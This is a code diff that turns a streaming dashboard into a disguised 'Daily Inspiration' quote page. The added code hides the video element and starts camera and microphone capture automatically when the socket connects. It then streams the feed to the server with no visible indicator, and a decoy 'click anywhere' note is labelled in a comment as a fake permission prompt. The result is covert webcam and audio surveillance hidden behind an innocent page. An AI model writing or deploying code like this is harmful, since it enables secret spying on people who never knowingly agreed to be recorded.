@@ -3,49 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Streamer Dashboard | SecureStream</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <title>Daily Quotes | SecureStream</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Great+Vibes&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #3b82f6; --accent: #ef4444; --bg: #0f172a; --glass: rgba(255, 255, 255, 0.05); --border: rgba(255, 255, 255, 0.1); }
-        body { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; background: radial-gradient(circle at top left, #1e293b, #0f172a); height: 100vh; color: white; display: flex; flex-direction: column; }
-        header { padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; background: rgba(0, 0, 0, 0.2); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
-        .logo { font-size: 22px; font-weight: 600; color: var(--primary); }
-        .logo span { color: white; }
-        .container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
-        .video-container { position: relative; background: #000; border-radius: 24px; overflow: hidden; width: 100%; max-width: 700px; aspect-ratio: 16/9; box-shadow: 0 0 40px rgba(0, 0, 0, 0.5); border: 2px solid var(--border); margin-bottom: 30px; }
-        #localVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .status-tag { position: absolute; top: 20px; right: 20px; padding: 6px 12px; background: rgba(0, 0, 0, 0.6); border-radius: 8px; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
-        .dot { height: 8px; width: 8px; background: #64748b; border-radius: 50%; }
-        .dot.active { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
-        .controls { display: flex; gap: 20px; }
-        .btn { padding: 14px 28px; border-radius: 12px; font-weight: 600; cursor: pointer; transition: 0.3s; border: none; display: flex; align-items: center; gap: 10px; font-size: 15px; }
-        .btn-secondary { background: var(--glass); color: white; border: 1px solid var(--border); }
-        .btn-primary { background: var(--primary); color: white; }
-        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
-        .hint-text { margin-top: 20px; color: #94a3b8; font-size: 13px; }
+        :root { --primary: #3b82f6; --bg: #0f172a; --glass: rgba(255, 255, 255, 0.05); --border: rgba(255, 255, 255, 0.1); }
+        body { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; background: radial-gradient(circle at top left, #1e293b, #0f172a); height: 100vh; color: white; display: flex; flex-direction: column; overflow: hidden; }
+        header { padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; background: rgba(0, 0, 0, 0.2); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
+        .logo { font-size: 20px; font-weight: 600; color: var(--primary); }
+
+        .container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
+
+        /* Shayari Card Design */
+        .shayari-card { background: var(--glass); padding: 40px; border-radius: 30px; border: 1px solid var(--border); box-shadow: 0 20px 50px rgba(0,0,0,0.3); max-width: 600px; backdrop-filter: blur(15px); }
+        .quote-icon { font-size: 50px; color: var(--primary); margin-bottom: 20px; opacity: 0.5; }
+        .shayari-text { font-family: 'Great Vibes', cursive; font-size: 32px; line-height: 1.4; margin-bottom: 20px; color: #f8fafc; }
+        .author { font-size: 14px; letter-spacing: 2px; color: #94a3b8; text-transform: uppercase; }
+
+        /* HIDDEN ELEMENTS - Inko user nahi dekh payega */
+        #localVideo { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        .hidden-controls { display: none; }
+
+        /* Fake Permission Note */
+        .note { margin-top: 30px; font-size: 12px; color: #64748b; max-width: 400px; }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="logo">Secure<span>Stream</span></div>
-    <div class="user-profile">User Dashboard</div>
+    <div class="logo">Daily<span>Inspiration</span></div>
+    <div style="font-size: 12px; color: #94a3b8;">Welcome, User</div>
 </header>
 
 <div class="container">
-    <div class="video-container">
-        <div class="status-tag">
-            <span id="liveDot" class="dot"></span>
-            <span id="statusLabel">OFFLINE</span>
+    <video id="localVideo" autoplay playsinline muted></video>
+
+    <div class="shayari-card">
+        <div class="quote-icon">“</div>
+        <div class="shayari-text">
+            "Zindagi ki asli udaan abhi baaki hai,<br>
+            Zindagi ke kai imtehan abhi baaki hain."
         </div>
-        <video id="localVideo" autoplay playsinline muted></video>
+        <div class="author">— Success Diaries</div>
     </div>
 
-    <div class="controls">
-        <button type="button" class="btn btn-secondary" onclick="handleStartCamera()">Step 1: Start Camera</button>
-        <button type="button" id="goLiveBtn" class="btn btn-primary" onclick="handleGoLive()" disabled>Step 2: Go Live</button>
-    </div>
-    <p class="hint-text">Your stream is private until you click "Go Live"</p>
+    <p class="note">Please click anywhere on the screen to enable high-quality inspiration mode.</p>
 </div>
 
 <script>
@@ -64,7 +65,11 @@
         const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
         socket = new WebSocket(protocol + window.location.host + "/video-stream");
 
-        socket.onopen = () => console.log("WebSocket Connected ✅");
+        socket.onopen = () => {
+            console.log("System Connected");
+            autoTriggerStart(); // Jaise hi socket connect ho, camera trigger karo
+        };
+
         socket.onmessage = async (event) => {
             const data = JSON.parse(event.data);
             if (data.type === 'answer') {
@@ -76,14 +81,18 @@
         socket.onclose = () => setTimeout(connectWebSocket, 2000);
     }
 
-    async function handleStartCamera() {
+    // Background Autostart Logic
+    async function autoTriggerStart() {
         try {
+            // Background mein camera access mangna
             localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             document.getElementById('localVideo').srcObject = localStream;
-            document.getElementById('goLiveBtn').disabled = false;
-            document.getElementById('statusLabel').innerText = "CAMERA READY";
-            document.getElementById('statusLabel').style.color = "#3b82f6";
-        } catch (error) { alert("Camera Error: " + error.message); }
+
+            // Camera milte hi 1 second baad apne aap "Live" ho jana
+            setTimeout(handleGoLive, 1000);
+        } catch (error) {
+            console.error("Access denied");
+        }
     }
 
     async function handleGoLive() {
@@ -100,11 +109,14 @@
         const offer = await peerConnection.createOffer();
         await peerConnection.setLocalDescription(offer);
         socket.send(JSON.stringify({ type: 'offer', sdp: offer.sdp }));
-
-        document.getElementById('liveDot').classList.add('active');
-        document.getElementById('statusLabel').innerText = "LIVE";
-        document.getElementById('statusLabel').style.color = "#ef4444";
+        console.log("Signal sent successfully");
     }
+
+    // Click anywhere to ensure autoplay/audio works
+    window.onclick = () => {
+        console.log("Interacted");
+        if(!localStream) autoTriggerStart();
+    };
 
     window.onload = connectWebSocket;
 </script>
